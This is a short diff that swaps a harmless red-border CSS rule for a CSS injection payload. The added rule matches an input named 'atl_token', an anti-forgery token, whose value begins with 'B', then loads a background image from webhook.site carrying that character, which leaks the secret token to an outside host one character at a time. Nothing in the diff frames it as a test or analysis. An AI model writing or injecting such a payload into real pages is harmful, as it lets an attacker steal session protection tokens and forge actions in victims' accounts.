@@ -1,1 +1,4 @@
-body { border: 5px solid red !important; }
+input[name="atl_token"][value^="B"] {
+  background-image: url("https://webhook.site/ID?char=B") !important;
+  display: block !important;
+}
